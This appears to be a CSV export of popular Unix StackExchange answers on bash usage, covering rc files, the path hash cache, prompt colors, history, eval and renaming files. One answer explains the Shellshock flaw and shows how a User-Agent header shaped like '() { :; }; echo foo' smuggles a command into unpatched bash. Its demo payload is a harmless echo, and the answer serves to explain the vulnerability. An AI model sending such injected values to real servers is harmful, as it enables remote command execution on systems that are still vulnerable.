Title,Id,Tags,Score,Body
"What does ""rc"" in .bashrc stand for?","3467","<bash><bashrc><history>","301","<p>As is often the case with obscure terms, the <a href=""http://www.catb.org/jargon/html/R/rc-file.html"">Jargon File</a> has an answer:</p>

<blockquote>
  <p>[Unix: from runcom files on the CTSS system 1962-63, via the startup script /etc/rc] Script file containing startup instructions for an application program (or an entire operating system), usually a text file containing commands of the sort that might have been invoked manually once the system was running but are to be executed automatically each time the system starts up.</p>
</blockquote>

<p>Thus, it would seem that the ""rc"" part stands for ""runcom"", which I believe can be expanded to ""run commands"".  In fact, this is exactly what the file contains, commands that bash should run.</p>
"
"How do I clear Bash's cache of paths to executables?","5609","<bash><executable><cache>","300","<p><code>bash</code> does cache the full path to a command.  You can verify that the command you are trying to execute is hashed with the <code>type</code> command:</p>

<pre><code>$ type svnsync
svnsync is hashed (/usr/local/bin/svnsync)
</code></pre>

<p>To clear the entire cache:</p>

<pre><code>$ hash -r
</code></pre>

<p>Or just one entry:</p>

<pre><code>$ hash -d svnsync
</code></pre>

<p>For additional information, consult <code>help hash</code> and <code>man bash</code>.</p>
"
"How to colorize output of git?","44266","<bash><colors><git>","294","<p>You can create a section <code>[color]</code> in your <code>~/.gitconfig</code> with e.g. the following content</p>

<pre><code>[color]
  diff = auto
  status = auto
  branch = auto
  interactive = auto
  ui = true
  pager = true
</code></pre>

<p>You can also fine control what you want to have coloured in what way, e.g.</p>

<pre><code>[color ""status""]
  added = green
  changed = red bold
  untracked = magenta bold

[color ""branch""]
  remote = yellow
</code></pre>

<p>I hope this gets you started. And of course, you need a terminal which supports colour.</p>
"
"How to get the pid of the last executed command in shell script?","30370","<bash><shell><process><background-process>","294","<p>The PID of the last executed command is in the <a href=""https://www.gnu.org/software/bash/manual/html_node/Special-Parameters.html#index-_0021-1"" rel=""noreferrer""><code>$!</code></a> shell variable:</p>

<pre><code>my-app &amp;
echo $!
</code></pre>
"
"How can I test if a variable is empty or contains only spaces?","146942","<bash><shell><shell-script><string>","278","<p>First, note that the <a href=""https://www.gnu.org/software/bash/manual/bashref.html#Bash-Conditional-Expressions""><code>-z</code> test</a> is explicitly for:</p>

<blockquote>
  <p>the length of string is zero</p>
</blockquote>

<p>That is, a string containing only spaces should <strong>not</strong> be true under <code>-z</code>, because it has a non-zero length.</p>

<p>What you want is to remove the spaces from the variable using the <a href=""https://www.gnu.org/software/bash/manual/bashref.html#Shell-Parameter-Expansion"">pattern replacement parameter expansion</a>:</p>

<pre><code>[[ -z ""${param// }"" ]]
</code></pre>

<p>This expands the <code>param</code> variable and replaces all matches of the pattern <code></code> (a single space) with nothing, so a string that has only spaces in it will be expanded to an empty string.</p>

<hr>

<p>The <a href=""https://www.gnu.org/software/bash/manual/bashref.html#Shell-Parameter-Expansion"">nitty-gritty of how that works</a> is that <code>${var/pattern/string}</code> replaces the first longest match of <code>pattern</code> with <code>string</code>. When <code>pattern</code> starts with <code>/</code> (as above) then it replaces <em>all</em> the matches. Because the replacement is empty, we can omit the final <code>/</code> and the <code>string</code> value:</p>

<blockquote>
  <p>${parameter/pattern/string}</p>
  
  <p>The <em>pattern</em> is expanded to produce a pattern just as in filename expansion. <em>Parameter</em> is expanded and the longest match of <em>pattern</em> against its value is replaced with <em>string</em>. If <em>pattern</em> begins with ‘/’, all matches of <em>pattern</em> are replaced with <em>string</em>. Normally only the first match is replaced. ... If <em>string</em> is null, matches of <em>pattern</em> are deleted and the / following <em>pattern</em> may be omitted.</p>
</blockquote>

<p>After all that, we end up with <code>${param// }</code> to delete all spaces.</p>

<p><sub>Note that though present in <code>ksh</code> (where it originated), <code>zsh</code> and <code>bash</code>, that syntax is not POSIX and should not be used in <code>sh</code> scripts.</sub></p>
"
"How to define 'tab' delimiter with 'cut' in BASH?","35369","<bash><cut>","278","<p>Two ways:</p>
<p>Press <kbd>Ctrl</kbd>+<kbd>V</kbd> and then <kbd>Tab</kbd> to use &quot;verbatim&quot; <a href=""https://www.gnu.org/software/bash/manual/html_node/Commands-For-Text.html"" rel=""noreferrer"">quoted insert</a>.</p>
<pre><code>cut -f2 -d'   ' infile
</code></pre>
<p>or write it like this to use <a href=""https://www.gnu.org/software/bash/manual/html_node/ANSI_002dC-Quoting.html"" rel=""noreferrer"">ANSI-C quoting</a>:</p>
<pre><code>cut -f2 -d$'\t' infile
</code></pre>
"
"Colorizing your terminal and shell environment?","148","<shell><bash><colors><prompt>","270","<p>Here are a couple of things you can do:</p>

<p><strong>Editors + Code</strong><br>
A lot of editors have syntax highlighting support. <code>vim</code> and <code>emacs</code> have it on by default. You can also <a href=""https://askubuntu.com/questions/90013/how-do-i-enable-syntax-highlighting-in-nano"">enable it under <code>nano</code></a>.</p>

<p>You can also syntax highlight code on the terminal by using <a href=""http://pygments.org/faq/#how-can-i-use-pygments"" rel=""noreferrer"">Pygments</a> as a command-line tool.</p>

<p><strong>grep</strong><br>
<code>grep --color=auto</code> highlights all matches. You can also use <code>export GREP_OPTIONS='--color=auto'</code> to make it persistent without an alias. If you use <code>--color=always</code>, it'll <a href=""http://linuxcommando.blogspot.com/2007/10/grep-with-color-output.html"" rel=""noreferrer"">use colour even when piping</a>, which confuses things.</p>

<p><strong>ls</strong></p>

<p><code>ls --color=always</code></p>

<p>Colors specified by:</p>

<pre><code>export LS_COLORS='rs=0:di=01;34:ln=01;36:mh=00:pi=40;33'
</code></pre>

<p>(hint: <code>dircolors</code> can be helpful)</p>

<p><strong>PS1</strong><br>
You can set your PS1 (shell prompt) to use colours. For example:</p>

<pre><code>PS1='\e[33;1m\u@\h: \e[31m\W\e[0m\$ '
</code></pre>

<p>Will produce a PS1 like:</p>

<p>[yellow]lucas@ubuntu: [red]~[normal]$ </p>

<p>You can get really creative with this. As an idea:</p>

<pre><code>PS1='\e[s\e[0;0H\e[1;33m\h    \t\n\e[1;32mThis is my computer\e[u[\u@\h:  \w]\$ '
</code></pre>

<p>Puts a bar at the top of your terminal with some random info. (For best results, also use <code>alias clear=""echo -e '\e[2J\n\n'""</code>.)</p>

<p><strong>Getting Rid of Escape Sequences</strong></p>

<p>If something is stuck outputting colour when you don't want it to, I use this <code>sed</code> line to strip the escape sequences:</p>

<pre><code>sed ""s/\[^[[0-9;]*[a-zA-Z]//gi""
</code></pre>

<p>If you want a more authentic experience, you can also get rid of lines starting with <code>\e[8m</code>, which instructs the terminal to hide the text. (Not widely supported.)</p>

<pre><code>sed ""s/^\[^[8m.*$//gi""
</code></pre>

<p>Also note that those ^[s should be actual, literal ^[s. You can type them by pressing ^V^[ in bash, that is <kbd>Ctrl</kbd> + <kbd>V</kbd>, <kbd>Ctrl</kbd> + <kbd>[</kbd>. </p>
"
"In a bash script, using the conditional ""or"" in an ""if"" statement","47584","<bash><shell-script>","260","<p>If you want to say <code>OR</code> use double pipe (<code>||</code>).</p>

<pre><code>if [ ""$fname"" = ""a.txt"" ] || [ ""$fname"" = ""c.txt"" ]
</code></pre>

<p>(The original OP code using <code>|</code> was simply piping the output of the left side to the right side, in the same way any ordinary pipe works.)</p>

<hr>

<p>After many years of comments and misunderstanding, allow me to clarify.</p>

<p>To do <code>OR</code> you use <code>||</code>.</p>

<p>Whether you use <code>[</code> or <code>[[</code> or <code>test</code> or <code>((</code> all depends on what you need on a case by case basis. It's wrong to say that one of those is preferred in all cases. Sometimes <code>[</code> is right and <code>[[</code> is wrong. But that's not what the question was. OP asked why <code>|</code> didn't work. The answer is because it should be <code>||</code> instead.</p>
"
"How to remove a single line from history?","49214","<bash><shell><command-line><command-history>","258","<h1>Preventative measures</h1>

<p>If you want to run a command without saving it in history, prepend it with an extra space</p>

<pre><code>prompt$ echo saved
prompt$  echo not saved \
&gt; #     ^ extra space
</code></pre>

<p>For this to work you need either <code>ignorespace</code> or <code>ignoreboth</code> in <code>HISTCONTROL</code>.  For example, run</p>

<pre><code>HISTCONTROL=ignorespace
</code></pre>

<p>To make this setting persistent, put it in your <code>.bashrc</code>.</p>

<h1>Post-mortem clean-up</h1>

<p>If you've already run the command, and want to remove it from history, first use</p>

<pre><code>history
</code></pre>

<p>to display the list of commands in your history.  Find the number next to the one you want to delete (e.g. 1234) and run </p>

<pre><code>history -d 1234
</code></pre>

<p>Additionally, if the line you want to delete has already been written to your $HISTFILE (which typically happens when you end a session by default), you will need to write back to $HISTFILE, or the line will reappear when you open a new session:</p>

<pre><code>history -w
</code></pre>
"
"Why doesn't my Bash script recognize aliases?","1496","<bash><alias>","256","<p>First of all, as ddeimeke said, aliases by default are not expanded in non-interactive shells.</p>

<p>Second, <code>.bashrc</code> is not read by non-interactive shells unless you set the <code>BASH_ENV</code> environment variable.</p>

<p>But most importantly: don't do that! Please? One day you will move that script somewhere where the necessary aliases are not set and it will break again.</p>

<p>Instead set and use variables as shortcuts in your script:</p>

<pre><code>#!/bin/bash

CMDA=/path/to/gizmo
CMDB=/path/to/huzzah.sh

for file in ""$@""
do
    $CMDA ""$file""
    $CMDB ""$file""
done
</code></pre>
"
"What does env x='() { :;}; command' bash do and why is it insecure?","157329","<bash><shellshock><vulnerability>","246","<p>bash stores exported function definitions as environment variables. Exported functions look like this:</p>

<pre class=""lang-none prettyprint-override""><code>$ foo() { bar; }
$ export -f foo
$ env | grep -A1 foo
foo=() {  bar
}
</code></pre>

<p>That is, the environment variable <code>foo</code> has the literal contents:</p>

<pre class=""lang-none prettyprint-override""><code>() {  bar
}
</code></pre>

<p>When a new instance of bash launches, it looks for these specially crafted environment variables, and interprets them as function definitions. You can even write one yourself, and see that it still works:</p>

<pre class=""lang-none prettyprint-override""><code>$ export foo='() { echo ""Inside function""; }'
$ bash -c 'foo'
Inside function
</code></pre>

<p>Unfortunately, the parsing of function definitions from strings (the environment variables) can have wider effects than intended. In unpatched versions, it also interprets arbitrary commands that occur after the termination of the function definition. This is due to insufficient constraints in the determination of acceptable function-like strings in the environment. For example:</p>

<pre class=""lang-none prettyprint-override""><code>$ export foo='() { echo ""Inside function"" ; }; echo ""Executed echo""'
$ bash -c 'foo'
Executed echo
Inside function
</code></pre>

<p>Note that the echo outside the function definition has been unexpectedly executed during bash startup. The function definition is just a step to get the evaluation and exploit to happen, the function definition itself and the environment variable used are arbitrary. The shell looks at the environment variables, sees <code>foo</code>, which looks like it meets the constraints it knows about what a function definition looks like, and it evaluates the line, unintentionally also executing the echo (which could be any command, malicious or not).</p>

<p>This is considered insecure because variables are not typically allowed or expected, by themselves, to directly cause the invocation of arbitrary code contained in them. Perhaps your program sets environment variables from untrusted user input. It would be highly unexpected that those environment variables could be manipulated in such a way that the user could run arbitrary commands without your explicit intent to do so using that environment variable for such a reason declared in the code.</p>

<p>Here is an example of a viable attack. You run a web server that runs a vulnerable shell, somewhere, as part of its lifetime. This web server passes environment variables to a bash script, for example, if you are using CGI, information about the HTTP request is often included as environment variables from the web server. For example, <code>HTTP_USER_AGENT</code> might be set to the contents of your user agent. This means that if you spoof your user agent to be something like '() { :; }; echo foo', when that shell script runs, <code>echo foo</code> will be executed. Again, <code>echo foo</code> could be anything, malicious or not.</p>
"
"How do I change the extension of multiple files?","19654","<bash><shell-script><rename>","244","<p>Straight from <a href=""https://mywiki.wooledge.org/BashFAQ/030"" rel=""noreferrer"">Greg's Wiki</a>:</p>

<pre>
# Rename all *.txt to *.text
for f in *.txt; do 
    mv -- ""$f"" ""${f%.txt}.text""
done
</pre>

<p>Also see the entry on why you <a href=""https://mywiki.wooledge.org/ParsingLs"" rel=""noreferrer"">shouldn't parse <code>ls</code></a>.</p>

<p>Edit: if you have to use <code>basename</code>, your syntax would be:</p>

<pre>
for f in *.txt; do
    mv -- ""$f"" ""$(basename -- ""$f"" .txt).text""
done
</pre>
"
"What is the ""eval"" command in bash?","23111","<bash><shell><eval>","241","<p><code>eval</code> is part of POSIX. Its an interface which can be a shell built-in.</p>

<p>Its described in the ""POSIX Programmer's Manual"": <a href=""http://www.unix.com/man-page/posix/1posix/eval/"">http://www.unix.com/man-page/posix/1posix/eval/</a></p>

<pre><code>eval - construct command by concatenating arguments
</code></pre>

<p>It will take an argument and construct a command of it, which will be executed by the shell. This is the example of the manpage:</p>

<pre><code>1) foo=10 x=foo
2) y='$'$x
3) echo $y
4) $foo
5) eval y='$'$x
6) echo $y
7) 10
</code></pre>

<ol>
<li>In the first line you define <code>$foo</code> with the value <code>'10'</code> and <code>$x</code> with the value <code>'foo'</code>. </li>
<li>Now define <code>$y</code>, which consists of the string <code>'$foo'</code>. The dollar sign must be escaped
with <code>'$'</code>. </li>
<li>To check the result, <code>echo $y</code>.</li>
<li>The result will be the string <code>'$foo'</code></li>
<li>Now we repeat the assignment with <code>eval</code>. It will first evaluate <code>$x</code> to the string <code>'foo'</code>. Now we have the statement <code>y=$foo</code> which will get evaluated to <code>y=10</code>.</li>
<li>The result of <code>echo $y</code> is now the value <code>'10'</code>.</li>
</ol>

<p>This is a common function in many languages, e.g. Perl and JavaScript.
Have a look at perldoc eval for more examples: <a href=""http://perldoc.perl.org/functions/eval.html"">http://perldoc.perl.org/functions/eval.html</a></p>
"
